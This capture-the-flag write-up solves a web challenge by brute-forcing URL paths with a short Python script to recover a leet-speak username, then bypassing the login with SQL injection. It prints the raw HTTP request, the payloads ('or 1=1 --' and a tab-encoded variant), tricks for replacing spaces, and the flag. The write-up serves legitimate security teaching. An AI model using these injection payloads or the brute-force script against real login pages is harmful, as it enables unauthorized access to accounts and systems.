# Space War
## Description
> I started war as i don't like EQUALity, i lost, they cut every LETTER of my name and sent them to different ROUTES. Wanna know my name in L33t???

Accessing the link provided, we came across a login page

![image](https://github.com/user-attachments/assets/879d0c69-81d6-4dbf-97de-4762fd2e3d8d)

When entering any combination of credentials, we get the following feedback

> Ummmm, I GUESS, you still don’t know my name.

By gathering the information from the description, and from this message, we can infer that it is necessary to guess the username, which is related in some way to the words EQUAL, LETTER and ROUTES.

With this, we can assume that there are routes that define the username, letter by letter (or you can find a route named K in a directory bruteforcing and infer from there).

![image](https://github.com/user-attachments/assets/5b1a5d4f-3f12-42f6-b46b-e104164c3e02)

This induces us to continue to discover letter by letter of the username. To do this, you can create a script in a language of your choice, or use Burp Intruder. The Intruder wordlist should contain letters (a-zA-Z) and numbers (0–9), as the username is in leet.

```python
import requests
import string

o = ""

while True:
    for s in string.printable:
        r = requests.get(f"http://34.132.132.69:8005/{o}{s}")
        if "wrong path" not in r.text:
            o += s
            print(o)
            break

```
After finishing this guessing process, we discovered the name Kur0s4k1

![image](https://github.com/user-attachments/assets/ea019336-1120-4531-a2e9-d46eb9081a73)

We return to the login page and try any password

> Invalid credentials.

And we discovered the existence of a SQL Injection in the password field.

```
POST /login HTTP/1.1
Host: 34.132.132.69:8005
Content-Length: 39
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://34.132.132.69:8005
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*; q=0.8,application/signed-exchange; v=b3; q=0.7
Referer: http://34.132.132.69:8005/
Accept-Encoding: gzip, deflate, br
Accept-Language: pt-PT,pt; q=0.9,en-US; q=0.8,en; q=0.7
Cookie: session=.eJztkLFqw0AMhl9FuSWL8QNkbKGQoWPpUEI5--RY5CwZSRdqQt6951Bo6dCxSzsJoV_6v1-X0I_RX0cyF13C7uUSemFH9rALdzn2p1xHmOBZNG1CE4qh1tHTWq7NV_Ue-sgsDtGs7sAiBYihV4xOfARRmFUmuTUfa-DVHfBtzkJuYNgXJV_gXDKjxo4yOaG1jwvMRWcxBDJwWS-dKSGMmOehZIicQNFmYaMuVxUPolM1Fm4_qe-rWyf-DfyPxOyi4c_JthOYqC4N7CFR4q1D4YRqvvquGVp4QMwwKOKKF-0EE1aqxccad_P_6Rv4EZ0cp99_9uH6DvoJXNM.ZX3H3w.v_3pIJFrUC7Mn4fZ6utF2pIzhMg
Connection: close

username=Kur0s4k1&password="+or+1=1+--+
```

## Payload 
- ```"+or+1=1+--+```
- ```%09OR%091=1;--%09-``` (%09 is [TAB]) <br>

That way we can bypass the login and get the flag. There are many ways in which we can bypass spaces, replace them with ```/**/``` or ```[TAB]```(what I did here) etc.

## Flag
```flag{1_kn0w_y0u_will_c0me_b4ck_S0M3DAY_0dsf513sg445s}```

